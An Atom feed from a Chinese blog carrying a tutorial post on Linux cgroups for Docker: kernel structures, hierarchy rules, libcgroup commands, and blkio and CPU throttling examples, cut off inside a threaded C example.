<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>t1ger的茶馆</title>
  <subtitle>头顶有光终是幻，足下生云未是仙</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t1ger.github.io/"/>
  <updated>2016-11-25T10:31:49.561Z</updated>
  <id>https://t1ger.github.io/</id>
  
  <author>
    <name>t1ger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>docker学习笔记之Linux cgroups</title>
    <link href="https://t1ger.github.io/2016/11/25/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BLinux-cgroups/"/>
    <id>https://t1ger.github.io/2016/11/25/docker学习笔记之Linux-cgroups/</id>
    <published>2016-11-25T06:50:26.000Z</published>
    <updated>2016-11-25T10:31:49.561Z</updated>
    
    <content type="html"><![CDATA[<h4 id="cgroup是什么"><a href="#cgroup是什么" class="headerlink" title="cgroup是什么"></a><b>cgroup是什么</b></h4><p>Linux CGroup全称Linux Control Group,Linux内核的一个功能,用来限制、控制与分离一个进程组群的资源(如CPU、内存、磁盘输入输出等),它最初叫Process Container,由Google工程师(Paul Menage和Rohit Seth)于2006年提出,后来因为Container有多重含义容易引起误解,就在2007年更名为Control Groups,并被整合进Linux内核2.6.24。<br>通俗的来说,cgroups可以限制、记录、隔离进程组所使用的物理资源,为容器实现虚拟化提供了基本保证,是构建Docker等一系列虚拟化管理工具的基石</p>
<p>本质上来说,cgroups是内核附加在程序上的一系列钩子(hooks),通过程序运行时对资源的调度触发相应的钩子以达到资源追踪和限制的目的<br>对开发者来说,cgroups有如下四个有趣的特点：</p>
<ul>
<li>cgroups的API以一个伪文件系统的方式实现,即用户可以通过文件操作实现cgroups的组织管理</li>
<li>cgroups的组织管理操作单元可以细粒度到线程级别,用户态代码也可以针对系统分配的资源创建和销毁cgroups,从而实现资源再分配和管理</li>
<li>所有资源管理的功能都以“subsystem(子系统)”的方式实现,接口统一</li>
<li>子进程创建之初与其父进程处于同一个cgroups的控制组</li>
</ul>
<h4 id="cgroup的功能"><a href="#cgroup的功能" class="headerlink" title="cgroup的功能"></a><b>cgroup的功能</b></h4><p>cgroups提供了以下四个功能</p>
<ul>
<li>资源限制(Resource Limitation):对进程组使用的资源总额进行限制<br>假如设置了内存上限,一旦超过配额就发出OOM(out of memory)</li>
<li>优先级分配(Prioritization):通过分配cpu的时间片数据及磁盘io带宽大学,进而控制了进程运行的优先级</li>
<li>资源统计(Accounting):统计系统资源使用量,比如统计cpu时长,内存用量,可用于计费功能</li>
<li>进程控制(Control):可以对进程组执行挂起、恢复等操作</li>
</ul>
<p>备注:有一段时间,内核开发者甚至把namespace也作为一个cgroups的subsystem加入进来,也就是说cgroups曾经甚至还包含了资源隔离的能力。但是资源隔离会给cgroups带来许多问题,如PID在循环出现的时候cgroup却出现了命名冲突、cgroup创建后进入新的namespace导致脱离了控制等等,所以在2011年就被移除了</p>
<p>在实践中，SA一般会利用cgroup做下面这些事：</p>
<ul>
<li>隔离一个进程集合（比如：nginx的所有进程），并限制他们所消费的资源</li>
<li>为这组进程 分配其足够使用的内存</li>
<li>为这组进程分配相应的网络带宽和磁盘存储限制</li>
<li>限制访问某些设备(通过设置设备的白名单)</li>
</ul>
<h4 id="组织结构和规则"><a href="#组织结构和规则" class="headerlink" title="组织结构和规则"></a><b>组织结构和规则</b></h4><p>在传统Unix进程管理,实际上是先启动init进程作为根节点,再由init节点创建子进程作为子节点,而每个子节点由可以创建新的子节点,如此往复,形成一个树状结构<br>cgroup也是类似的树状结构,子节点也从父节点继承属性<br>区别在于,cgroup构成的hierarchy可以允许存在多个,如果进程模型是由init作为根节点构成的一棵树的话,那么cgroups的模型则是由多个hierarchy构成的森林。原因在于,如果只有一个hierarchy,那么所有的task都要受到绑定其上的subsystem的限制,会给那些不需要这些限制的task造成麻烦</p>
<ul>
<li>规则1:同一个hierarchy可以附加一个或多个subsystem,cpu和memory的subsystem附加到了一个hierarchy</li>
<li>规则2:一个subsystem可以附加到多个hierarchy,当且仅当这些hierarchy只有这唯一一个subsystem</li>
<li>规则3:系统每次新建一个hierarchy时,该系统上的所有task默认构成了这个新建的hierarchy的初始化cgroup,这个cgroup也称为root cgroup。对于你创建的每个hierarchy,task只能存在于其中一个cgroup中,即一个task不能存在于同一个hierarchy的不同cgroup中,但是一个task可以存在在不同hierarchy中的多个cgroup中。如果操作时把一个task添加到同一个hierarchy中的另一个cgroup中,则会从第一个cgroup中移除</li>
<li>规则4:进程（task）在fork自身时创建的子任务(child task)默认与原task在同一个cgroup中,但是child task允许被移动到不同的cgroup中。即fork完成后,父子进程间是完全独立的</li>
</ul>
<h4 id="cgroup工作原理和实现方式"><a href="#cgroup工作原理和实现方式" class="headerlink" title="cgroup工作原理和实现方式"></a><b>cgroup工作原理和实现方式</b></h4><ul>
<li>cgroup实现结构讲解<br>cgroup的实现本质上是给系统进程挂上钩子(hooks),当task运行的过程中涉及到某个资源时就会触发钩子上所附带的subsystem进行检测,最终根据资源类别的不同使用对应的技术进行资源限制和优先级分配</li>
</ul>
<p>Linux中管理task进程的数据结构为task_struct<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#ifdef CONFIG_CGROUPS </div><div class="line">/* Control Group info protected by css_set_lock */ </div><div class="line">struct css_set *cgroups; </div><div class="line">/* cg_list protected by css_set_lock and tsk-&gt;alloc_lock */ </div><div class="line">struct list_head cg_list; </div><div class="line">#endif</div><div class="line">struct css_set &#123; </div><div class="line">atomic_t refcount;</div><div class="line">struct hlist_node hlist; </div><div class="line">struct list_head tasks; </div><div class="line">struct list_head cg_links; </div><div class="line">struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT]; </div><div class="line">struct rcu_head rcu_head; </div><div class="line">&#125;;</div><div class="line">struct cgroup_subsys_state &#123; </div><div class="line">struct cgroup *cgroup; </div><div class="line">atomic_t refcnt; </div><div class="line">unsigned long flags; </div><div class="line">struct css_id *id; </div><div class="line">&#125;;</div><div class="line">struct cgroup &#123; </div><div class="line">unsigned long flags; </div><div class="line">atomic_t count; </div><div class="line">struct list_head sibling; </div><div class="line">struct list_head children; </div><div class="line">struct cgroup *parent; </div><div class="line">struct dentry *dentry; </div><div class="line">struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT]; </div><div class="line">struct cgroupfs_root *root;</div><div class="line">struct cgroup *top_cgroup; </div><div class="line">struct list_head css_sets; </div><div class="line">struct list_head release_list; </div><div class="line">struct list_head pidlists;</div><div class="line">struct mutex pidlist_mutex; </div><div class="line">struct rcu_head rcu_head; </div><div class="line">struct list_head event_list; </div><div class="line">spinlock_t event_list_lock; </div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>在task_struct中,与cgroup相关的字段主要有两个,一个是css_set *cgroups,表示指向css_set（包含进程相关的cgroups信息）的指针,一个task只对应一个css_set结构,但是一个css_set可以被多个task使用。另一个字段是list_head cg_list,是一个链表的头指针,这个链表包含了所有的链到同一个css_set的task进程。每个css_set结构中都包含了一个指向cgroup_subsys_state(包含进程与一个特定子系统相关的信息)的指针数组。cgroup_subsys_state则指向了cgroup结构(包含一个cgroup的所有信息),通过这种方式间接的把一个进程和cgroup联系了起来</p>
<p>另一方面,cgroup结构体中有一个list_head css_sets字段,它是一个头指针,指向由cg_cgroup_link（包含cgroup与task之间多对多关系的信息）形成的链表。由此获得的每一个cg_cgroup_link都包含了一个指向css_set *cg字段,指向了每一个task的css_set。css_set结构中则包含tasks头指针,指向所有链到此css_set的task进程构成的链表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct cg_cgroup_link &#123; </div><div class="line">struct list_head cgrp_link_list; </div><div class="line">struct cgroup *cgrp; </div><div class="line">struct list_head cg_link_list; </div><div class="line">struct css_set *cg; &#125;;</div></pre></td></tr></table></figure>
<p>css_set中也有指向所有cg_cgroup_link构成链表的头指针,通过这种方式也能定位到所有的cgroup</p>
<p>为什么要使用cg_cgroup_link结构体呢？<br>因为task与cgroup之间是多对多的关系。在数据库中,如果两张表是多对多的关系,那么如果不加入第三张关系表,就必须为一个字段的不同添加许多行记录,导致大量冗余。通过从主表和副表各拿一个主键新建一张关系表,可以提高数据查询的灵活性和效率。而一个task可能处于不同的cgroup,只要这些cgroup在不同的hierarchy中,并且每个hierarchy挂载的子系统不同:另一方面,一个cgroup中可以有多个task,这是显而易见的,但是这些task因为可能还存在在别的cgroup中,所以它们对应的css_set也不尽相同,所以一个cgroup也可以对应多个·css_set。在系统运行之初,内核的主函数就会对root cgroups和css_set进行初始化,每次task进行fork/exit时,都会附加（attach）/分离（detach）对应的css_set。综上所述,添加cg_cgroup_link主要是出于性能方面的考虑,一是节省了task_struct结构体占用的内存,二是提升了进程fork()/exit()的速度</p>
<p>当task从一个cgroup中移动到另一个时,它会得到一个新的css_set指针。如果所要加入的cgroup与现有的cgroup子系统相同,那么就重复使用现有的css_set,否则就分配一个新css_set。所有的css_set通过一个哈希表进行存放和查询,hlist_node hlist就指向了css_set_table这个hash表。同时,为了让cgroups便于用户理解和使用,也为了用精简的内核代码为cgroup提供熟悉的权限和命名空间管理,内核开发者们按照Linux 虚拟文件系统转换器（VFS：Virtual Filesystem Switch）的接口实现了一套名为cgroup的文件系统,非常巧妙地用来表示cgroups的hierarchy概念,把各个subsystem的实现都封装到文件系统的各项操作中。定义子系统的结构体是cgroup_subsys,cgroup_subsys中定义了一组函数的接口,让各个子系统自己去实现,类似的思想还被用在了cgroup_subsys_state中,cgroup_subsys_state并没有定义控制信息,只是定义了各个子系统都需要用到的公共信息,由各个子系统各自按需去定义自己的控制信息结构体,最终在自定义的结构体中把cgroup_subsys_state包含进去,然后内核通过container_of等宏定义来获取对应的结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">struct cgroup_subsys &#123; </div><div class="line">struct cgroup_subsys_state *(*create)(struct cgroup_subsys *ss, </div><div class="line">struct cgroup *cgrp); </div><div class="line">int (*pre_destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">int (*can_attach)(struct cgroup_subsys *ss,</div><div class="line"> struct cgroup *cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*cancel_attach)(struct cgroup_subsys *ss, </div><div class="line">struct cgroup *cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*attach)(struct cgroup_subsys *ss, struct cgroup *cgrp, </div><div class="line">struct cgroup *old_cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*fork)(struct cgroup_subsys *ss, struct task_struct *task); </div><div class="line">void (*exit)(struct cgroup_subsys *ss, struct task_struct *task); </div><div class="line">int (*populate)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*post_clone)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*bind)(struct cgroup_subsys *ss, struct cgroup *root);</div><div class="line">int subsys_id; </div><div class="line">int active; </div><div class="line">int disabled; </div><div class="line">int early_init; </div><div class="line">bool use_id; </div><div class="line">#define MAX_CGROUP_TYPE_NAMELEN 32 </div><div class="line">const char *name; </div><div class="line">struct mutex hierarchy_mutex; </div><div class="line">struct lock_class_key subsys_key; </div><div class="line">struct cgroupfs_root *root; </div><div class="line">struct list_head sibling; </div><div class="line">struct idr idr; </div><div class="line">spinlock_t id_lock; </div><div class="line">struct module *module; </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ul>
<li>基于cgroups实现结构的用户层体现</li>
</ul>
<p>在实际使用时,需要通过挂载（mount）cgroup文件系统新建一个层级结构,挂载时指定要绑定的子系统,缺省情况下默认绑定系统所有子系统。把cgroup文件系统挂载（mount）上以后,你就可以像操作文件一样对cgroups的hierarchy层级进行浏览和操作管理,包括权限管理、子文件管理等等。除了cgroup文件系统以外,内核没有为cgroups的访问和操作添加任何系统调用。如果新建的层级结构要绑定的子系统与目前已经存在的层级结构完全相同,那么新的挂载会重用原来已经存在的那一套（指向相同的css_set）。否则如果要绑定的子系统已经被别的层级绑定,就会返回挂载失败的错误。如果一切顺利,挂载完成后层级就被激活并与相应子系统关联起来,可以开始使用了</p>
<p>目前无法将一个新的子系统绑定到激活的层级上,或者从一个激活的层级中解除某个子系统的绑定。<br>当一个顶层的cgroup文件系统被卸载（umount）时,如果其中创建后代cgroup目录,那么就算上层的cgroup被卸载了,层级也是激活状态,其后代cgoup中的配置依旧有效。只有递归式的卸载层级中的所有cgoup,那个层级才会被真正删除</p>
<p>层级激活后,/proc目录下的每个task PID文件夹下都会新添加一个名为cgroup的文件,列出task所在的层级,对其进行控制的子系统及对应cgroup文件系统的路径。<br>一个cgroup创建完成,不管绑定了何种子系统,其目录下都会生成以下几个文件,用来描述cgroup的相应信息。同样,把相应信息写入这些配置文件就可以生效,内容如下：<br>tasks：这个文件中罗列了所有在该cgroup中task的PID。该文件并不保证task的PID有序,把一个task的PID写到这个文件中就意味着把这个task加入这个cgroup中。<br>cgroup.procs：这个文件罗列所有在该cgroup中的线程组ID。该文件并不保证线程组ID有序和无重复。写一个线程组ID到这个文件就意味着把这个组中所有的线程加到这个cgroup中。<br>notify_on_release：填0或1,表示是否在cgroup中最后一个task退出时通知运行release agent,默认情况下是0,表示不运行。<br>release_agent：指定release agent执行脚本的文件路径,该文件在最顶层cgroup目录中存在,在这个脚本通常用于自动化umount无用的cgroup</p>
<p>除了上述几个通用的文件以外,绑定特定子系统的目录下也会有其他的文件进行子系统的参数配置。在创建的hierarchy中创建文件夹,就类似于fork中一个后代cgroup,后代cgroup中默认继承原有cgroup中的配置属性,但是你可以根据需求对配置参数进行调整。这样就把一个大的cgroup系统分割成一个个嵌套的、可动态变化的“软分区”</p>
<h4 id="cgroup的使用方法简介"><a href="#cgroup的使用方法简介" class="headerlink" title="cgroup的使用方法简介"></a><b>cgroup的使用方法简介</b></h4><ul>
<li><p>安装cgroups工具库<br>安装的过程会自动创建/cgroup目录,如果没有自动创建也不用担心,使用mkdir /cgroup 手动创建即可<br>安装完成后,你就可以使用lssubsys,默认的cgroup配置文件为/etc/cgconfig.conf,但是因为存在使LXC无法运行的bug,所以在新版本中把这个配置移除了</p>
</li>
<li><p>查询cgroup及子系统挂载状态<br>在挂载子系统之前,可能你要先检查下目前子系统的挂载状态,如果子系统已经挂载,你就无法把子系统挂载到新的hierarchy,此时就需要先删除相应hierarchy或卸载对应子系统后再挂载。<br>查看所有的cgroup：lscgroup<br>查看所有支持的子系统：lssubsys -a<br>查看所有子系统挂载的位置： lssubsys –m<br>查看单个子系统挂载位置：lssubsys –m memory（以memory为例）</p>
</li>
<li>创建hierarchy层级并挂载子系统<br>使用cgroup的最佳方式是为想要管理的每个或每组资源创建单独的cgroup层级结构。而创建hierarchy并不神秘,实际上就是做一个标记,通过挂载一个tmpfs文件系统,并给一个好的名字就可以了</li>
</ul>
<p>系统默认挂载的cgroup就会进行如下操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount -t tmpfs cgroups /sys/fs/cgroup</div></pre></td></tr></table></figure>
<p>挂载完成tmpfs后就可以通过mkdir命令创建相应的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure></p>
<p>再把子系统挂载到相应层级上,挂载子系统也使用mount命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount -t cgroup -o subsystems name /cgroup/name</div></pre></td></tr></table></figure></p>
<p>name是层级名称。具体我们以挂载cpu和memory的子系统为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount –t cgroup –o cpu,memory cpu_and_mem /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure></p>
<p>从mount命令开始,-t后面跟的是挂载的文件系统类型,即cgroup文件系统。-o后面跟要挂载的子系统种类如cpu、memory,用逗号隔开,其后的cpu_and_mem不被cgroup代码的解释,但会出现在/proc/mounts里,可以使用任何有用的标识字符串。最后的参数则表示挂载点的目录位置</p>
<ul>
<li>卸载cgroup<br>cgroup文件系统虽然支持重新挂载,但是官方不建议使用,重新挂载虽然可以改变绑定的子系统和release agent,但是它要求对应的hierarchy是空的并且release_agent会被传统的fsnotify（内核默认的文件系统通知）代替,这就导致重新挂载很难生效。可以通过卸载,再挂载的方式处理这样的需求</li>
</ul>
<p>卸载cgroup非常简单,你可以通过cgdelete命令,也可以通过rmdir</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rmdir /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure>
<p>rmdir执行成功的必要条件是cg1下层没有创建其它cgroup,cg1中没有添加任何task,并且它也没有被别的cgroup所引用。<br>cgdelete cpu,memory:/ 使用cgdelete命令可以递归的删除cgroup及其命令下的后代cgroup,并且如果cgroup中有task,那么task会自动移到上一层没有被删除的cgroup中,如果所有的cgroup都被删除了,那task就不被cgroups控制。但是一旦再次创建一个新的cgroup,所有进程都会被放进新的cgroup中</p>
<ul>
<li>设置cgroups参数<br>设置cgroups参数非常简单,直接对之前创建的cgroup对应文件夹下的文件写入即可。<br>设置task允许使用的cpu为0和1</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 0-1 &gt; /sys/fs/cgroup/cg1/cpuset.cpus</div></pre></td></tr></table></figure>
<p>使用cgset命令也可以进行参数设置,对应上述允许使用0和1cpu</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgset -r cpuset.cpus=0-1 cpu,memory:/</div></pre></td></tr></table></figure>
<ul>
<li>添加task到cgroup<br>通过文件操作进行添加<br>echo [PID] &gt; /path/to/cgroup/tasks<br>上述命令就是把进程ID打印到tasks中,如果tasks文件中已经有进程,需要使用”&gt;&gt;”向后添加。<br>通过cgclassify将进程添加到cgroup</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgclassify -g subsystems:path_to_cgroup pidlist</div></pre></td></tr></table></figure>
<p>这个命令中,subsystems指的就是子系统(如果使用man命令查看,可能也会使用controllers表示)​​​,如果mount了多个,就是用”,”隔开的子系统名字作为名称,类似cgset命令。<br>通过cgexec直接在cgroup中启动并执行进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgexec -g subsystems:path_to_cgroup command arguments</div></pre></td></tr></table></figure>
<p>command和arguments就表示要在cgroup中执行的命令和参数<br>cgexec常用于执行临时的任务</p>
<ul>
<li>权限管理<br>与文件的权限管理类似,通过chown就可以对cgroup文件系统进行权限管理</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chown uid:gid /path/to/cgroup</div></pre></td></tr></table></figure>
<h4 id="subsystem的配置参数用法"><a href="#subsystem的配置参数用法" class="headerlink" title="subsystem的配置参数用法"></a><b>subsystem的配置参数用法</b></h4><ul>
<li>BLOCK IO资源控制<br>限额类。限额类是主要有两种策略,一种是基于完全公平队列调度（CFQ：Completely Fair Queuing）的按权重分配各个cgroup所能占用总体资源的百分比,好处是当资源空闲时可以充分利用,但只能用于最底层节点cgroup的配置；另一种则是设定资源使用上限,这种限额在各个层次的cgroup都可以配置,但这种限制较为生硬,并且容器之间依然会出现资源的竞争。<br>按比例分配块设备IO资源：<br>blkio.weight：填写100-1000的一个整数值,作为相对权重比率,作为通用的设备分配比。<br>blkio.weight_device：针对特定设备的权重比,写入格式为device_types:node_numbers weight,空格前的参数段指定设备,weight参数与blkio.weight相同并覆盖原有的通用分配比。查看一个设备的device_types:node_numbers可以使用：ls -l /dev/DEV,看到的用逗号分隔的两个数字就是。也称之为major_number:minor_number。<br>控制IO读写速度上限：<br>blkio.throttle.read_bps_device：按每秒读取块设备的数据量设定上限,格式device_types:node_numbers bytes_per_second。<br>blkio.throttle.write_bps_device：按每秒写入块设备的数据量设定上限,格式device_types:node_numbers bytes_per_second。<br>blkio.throttle.read_iops_device：按每秒读操作次数设定上限,格式device_types:node_numbers operations_per_second。<br>blkio.throttle.write_iops_device：按每秒写操作次数设定上限,格式device_types:node_numbers operations_per_second。<br>针对特定操作(read, write, sync, 或async)设定读写速度上限。<br>blkio.throttle.io_serviced：针对特定操作按每秒操作次数设定上限,格式device_types:node_numbers operation operations_per_second。<br>blkio.throttle.io_service_bytes：针对特定操作按每秒数据量设定上限,格式device_types:node_numbers operation bytes_per_second。<br>统计与监控。以下内容都是只读的状态报告,通过这些统计项更好地统计、监控进程的io情况。<br>blkio.reset_stats：重置统计信息,写入一个int值即可。<br>blkio.time：统计cgroup对设备的访问时间,按格式device_types:node_numbers milliseconds读取信息即可,以下类似。<br>blkio.io_serviced：统计cgroup对特定设备的IO操作,包括read、write、sync及async次数,格式device_types:node_numbers operation number。<br>blkio.sectors：统计cgroup对设备扇区访问次数,格式 device_types:node_numbers sector_count。<br>blkio.io_service_bytes：统计cgroup对特定设备IO操作,包括read、write、sync及async的数据量,格式device_types:node_numbers operation bytes。<br>blkio.io_queued：统计cgroup的队列中对IO操作,包括read、write、sync及async的请求次数,格式number operation。<br>blkio.io_service_time：统计cgroup对特定设备的IO操作,包括read、write、sync及async时间(单位为ns),格式device_types:node_numbers operation time。<br>blkio.io_merged：统计cgroup 将 BIOS 请求合并到IO操作,包括read、write、sync及async请求的次数,格式number operation。<br>blkio.io_wait_time：统计cgroup在各设​​​备​​​中各类型​​​IO操作,包括read、write、sync及async在队列中的等待时间​(单位ns),格式device_types:node<em>numbers operation time。<br><strong>blkio.</strong>recursive</em>*：各类型的统计都有一个递归版本,Docker中使用的都是这个版本。获取的数据与非递归版本是一样的,但是包括cgroup所有层级的监控数据</li>
</ul>
<p>我们的模拟命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dd if=/dev/sda1 of=/dev/null</div></pre></td></tr></table></figure></p>
<p>通过iotop命令我们可以看到相关的IO速度是55MB/s(vm)<br>之后，我们先创建一个blkio（块设备IO）的cgroup，并把读IO限制到1MB/s，并把前面那个dd命令的pid放进去(注：8:0 是设备号，你可以通过ls -l /dev/sda1获得)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir /sys/fs/cgroup/blkio/cg1</div><div class="line">echo &apos;8:0 1048576&apos;  &gt; /sys/fs/cgroup/blkio/cgl/blkio.throttle.read_bps_device</div><div class="line">echo 8128 &gt; /sys/fs/cgroup/blkio/haoel/tasks</div></pre></td></tr></table></figure></p>
<p>再用iotop命令，你马上就能看到读速度被限制到了1MB/s左右</p>
<ul>
<li>CPU资源控制<br>CPU资源的控制也有两种策略,一种是完全公平调度（CFS：Completely Fair Scheduler）策略,提供了限额和按比例分配两种方式进行资源控制；另一种是实时调度（Real-Time Scheduler）策略,针对实时进程按周期分配固定的运行时间。配置时间都以微秒（µs）为单位,文件名中用us表示。<br>CFS调度策略配置：<br>设定CPU使用周期使用时间上限。<br>cpu.cfs_period_us：设定周期时间,必须与cfs_quota_us配合使用。<br>cpu.cfs_quota_us：设定周期内最多可使用的时间。这里的配置指task对单个cpu的使用上限,若cfs_quota_us是cfs_period_us的两倍,就表示在两个核上完全使用。数值范围为1000-1000,000（微秒）。<br>cpu.stat：统计信息,包含nr_periods（表示经历了几个cfs_period_us周期）、nr_throttled（表示task被限制的次数）及throttled_time（表示task被限制的总时长）。<br>按权重比例设定CPU的分配。<br>cpu.shares：设定一个整数,必须大于等于2,表示相对权重,最后除以权重总和算出相对比例,按比例分配CPU时间。如cgroup A设置100,cgroup B设置300,那么cgroup A中的task运行25%的CPU时间。对于一个4核CPU的系统来说,cgroup A中的task可以100%占有某一个CPU,这个比例是相对整体的一个值。<br>RT调度策略下的配置：<br>实时调度策略与公平调度策略中的按周期分配时间的方法类似,也是在周期内分配一个固定的运行时间。<br>cpu.rt_period_us：设定周期时间。<br>cpu.rt_runtime_us：设定周期中的运行时间</li>
</ul>
<p>假设，我们有个非常耗cpu的程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int i = 0;</div><div class="line">    for(;;) i++;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>执行后，可以top看到进程pid为3529</p>
<p>在/sys/fs/cgroup/cpu下建立cg1的group<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us </div><div class="line">-1</div><div class="line">echo 20000 &gt; /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us</div><div class="line"># 将进程的pid加入到cgroup中</div><div class="line">echo 3529 &gt;&gt; /sys/fs/cgroup/cpu/haoel/tasks</div></pre></td></tr></table></figure></p>
<p>之后，在top中看到cpu下降了20%</p>
<p>下边代码是一个线程示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">#define _GNU_SOURCE         /* See feature_test_macros(7) */</div><div class="line"> </div><div class="line">#include &lt;pthread.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"> </div><div class="line"> </div><div class="line">const int NUM_THREADS = 5;</div><div class="line"> </div><div class="line">void *thread_main(void *threadid)</div><div class="line">&#123;</div><div class="line">    /* 把自己加入cgroup中（syscall(SYS_gettid)为得到线程的系统tid） */</div><div class="line">    char cmd[128];</div><div class="line">    sprintf(cmd, &quot;echo %ld &gt;&gt; /sys/fs/cgroup/cpu/haoel/tasks&quot;, syscall(SYS_gettid));</div><div class="line">    system(cmd); </div><div class="line">    sprintf(cmd, &quot;echo %ld &gt;&gt; /sys/fs/cgroup/cpuset/haoel/tasks&quot;, syscall(SYS_gettid));</div><div class="line">    system(cmd);</div><div class="line"> </div><div class="line">    long tid;</div><div class="line">    tid = (long)threadid;</div><div class="line">    printf(&quot;Hello World! It&apos;s me, thread #%ld, pid #%ld!\n&quot;, tid, syscall(SYS_gettid));</div><div class="line">     </div><div class="line">    int a=0; </div><div class="line">    while(1) &#123;</div><div class="line">        a++;</div><div class="line">    